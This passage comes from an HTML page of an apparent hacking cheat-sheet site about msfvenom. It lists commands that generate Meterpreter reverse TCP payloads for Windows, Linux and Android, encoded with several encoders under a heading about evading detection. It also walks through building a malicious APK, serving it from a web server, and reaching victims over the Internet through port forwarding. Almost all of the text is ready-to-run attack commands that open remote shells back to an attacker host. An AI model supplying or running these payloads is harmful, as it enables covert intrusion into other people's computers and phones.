+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-e<span class="w"> </span>x64/xor_dynamic<span class="w"> </span>-i<span class="w"> </span><span class="m">3</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>encodedevil.exe<span class="sb">`</span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="c1"># Windows x64 Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-e<span class="w"> </span>x64/xor_dynamic<span class="w"> </span>-i<span class="w"> </span><span class="m">3</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>encodedevil.exe<span class="sb">`</span>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="c1"># Linux x86 Non-Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x86/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-e<span class="w"> </span>x86/call4_dword_xor<span class="w"> </span>-i<span class="w"> </span><span class="m">3</span><span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>-o<span class="w"> </span>reverse.elf<span class="sb">`</span>
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="c1"># Linux x86 Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x86/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>--platform<span class="w"> </span>linux<span class="w"> </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-i<span class="w"> </span><span class="m">5</span><span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>--smallest<span class="w"> </span>-o<span class="w"> </span>reverse.elf<span class="sb">`</span>
+</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>
+</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="c1"># Linux x64 Non-Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-e<span class="w"> </span>x64/xor_context<span class="w"> </span>-i<span class="w"> </span><span class="m">3</span><span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>-o<span class="w"> </span>reverse.elf<span class="sb">`</span>
+</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a>
+</span><span id="__span-5-22"><a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a><span class="c1"># Linux x64 Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-5-23"><a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>--platform<span class="w"> </span>linux<span class="w"> </span>-e<span class="w"> </span>x64/xor_context<span class="w"> </span>-i<span class="w"> </span><span class="m">3</span><span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>--smallest<span class="w"> </span>-o<span class="w"> </span>reverse.elf<span class="sb">`</span>
+</span></code></pre></div>
+<h3 id="6-other-possible-evasion-detection-payloads">6. Other possible evasion detection payloads</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Windows x86 Non-Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-e<span class="w"> </span>x86/alpha_mixed<span class="w"> </span>-i<span class="w"> </span><span class="m">5</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>encodedevil.exe<span class="sb">`</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1"># Windows x86 Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-e<span class="w"> </span>x86/alpha_upper<span class="w"> </span>-i<span class="w"> </span><span class="m">3</span><span class="w"> </span>-a<span class="w"> </span>x86<span class="w"> </span>--platform<span class="w"> </span>windows<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>--smallest<span class="w"> </span>-o<span class="w"> </span>encodedevil.exe<span class="sb">`</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="c1"># Windows x64 Non-Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-e<span class="w"> </span>x64/zutto_dekiru<span class="w"> </span>-i<span class="w"> </span><span class="m">3</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>encodedevil.exe<span class="sb">`</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="c1"># Windows x64 Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-e<span class="w"> </span>x64/zutto_dekiru<span class="w"> </span>-i<span class="w"> </span><span class="m">3</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>encodedevil.exe<span class="sb">`</span>
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="c1"># Linux x86 Non-Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x86/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-e<span class="w"> </span>x86/alpha_mixed<span class="w"> </span>-i<span class="w"> </span><span class="m">5</span><span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>-o<span class="w"> </span>reverse.elf<span class="sb">`</span>
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>
+</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="c1"># Linux x86 Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x86/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>--platform<span class="w"> </span>linux<span class="w"> </span>-e<span class="w"> </span>x86/alpha_upper<span class="w"> </span>-i<span class="w"> </span><span class="m">3</span><span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>--smallest<span class="w"> </span>-o<span class="w"> </span>reverse.elf<span class="sb">`</span>
+</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>
+</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a><span class="c1"># Linux x64 Non-Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-e<span class="w"> </span>x64/xor_context<span class="w"> </span>-i<span class="w"> </span><span class="m">3</span><span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>-o<span class="w"> </span>reverse.elf<span class="sb">`</span>
+</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a>
+</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a><span class="c1"># Linux x64 Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>--platform<span class="w"> </span>linux<span class="w"> </span>-e<span class="w"> </span>x64/xor_context<span class="w"> </span>-i<span class="w"> </span><span class="m">3</span><span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>--smallest<span class="w"> </span>-o<span class="w"> </span>reverse.elf<span class="sb">`</span>
+</span></code></pre></div>
+<p><strong>Example : Generating a Payload with msfvenom</strong></p>
+<blockquote>
+<p>At first, fire up the Kali Linux so that we may generate an apk file as a malicious payload. 
+We need to check our local IP that turns out to be <code>192.xxx.x.xxx</code>. 
+You can also hack an Android device through Internet by using your Public/External IP in the LHOST and by port forwarding.</p>
+</blockquote>
+<p>After getting your Local host IP use msfvenom tool that will generate a payload to penetrate the Android device. </p>
+<p>Type command: </p>
+<p><code>msfvenom –p android/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=4444 R&gt; /var/www/html/ehacking.apk**
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Where:
+</span></code></pre></div>
+-p indicates a payload type
+android/metepreter/reverse_tcp specifies a reverse meterpreter shell would come in from a target Android device
+LHOST is your local IP
+LPORT is set to be as a listening port
+R&gt; /var/www/html would give the output directly on apache server
+apk is the final name of the final outpu</code>
+This would take some time to generate an apk file of almost ten thousand bytes.  </p>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/msfvenom.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
